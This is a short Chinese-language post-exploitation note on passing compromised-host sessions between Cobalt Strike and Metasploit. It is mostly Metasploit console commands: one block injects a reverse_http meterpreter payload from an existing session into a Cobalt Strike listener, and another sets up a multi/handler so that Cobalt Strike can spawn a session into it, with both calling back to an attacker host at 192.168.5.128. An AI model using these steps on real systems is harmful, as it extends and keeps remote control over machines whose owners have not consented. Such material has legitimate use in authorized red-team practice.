# Cobaltstrike与MSF会话派生

## msf派生CS

CS新建监听

![Untitled](Cobaltstrike%E4%B8%8EMSF%E4%BC%9A%E8%AF%9D%E6%B4%BE%E7%94%9F%209fa09f90eddc40228d9ac6388d894d5c/Untitled.png)

msf执行

```c
use exploit/windows/local/payload_inject
set payload windows/meterpreter/reverse_http
set DisablePayloadHandler true
set lhost 192.168.5.128
set lport 8888
set session 1
run
```

## CS派生msf

msf新建监听

```c
msf6 > use exploit/multi/handler 
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http 
msf6 exploit(multi/handler) > set lhost 192.168.5.128
msf6 exploit(multi/handler) > set lport 1234
msf6 exploit(multi/handler) > run -j
```

cs新建一个监听器，地址为msf地址，端口为msf的监听端口

![Untitled](Cobaltstrike%E4%B8%8EMSF%E4%BC%9A%E8%AF%9D%E6%B4%BE%E7%94%9F%209fa09f90eddc40228d9ac6388d894d5c/Untitled%201.png)

在 cs的现有会话上增加会话，监听器选择刚才创建的msf监听端口

![Untitled](Cobaltstrike%E4%B8%8EMSF%E4%BC%9A%E8%AF%9D%E6%B4%BE%E7%94%9F%209fa09f90eddc40228d9ac6388d894d5c/Untitled%202.png)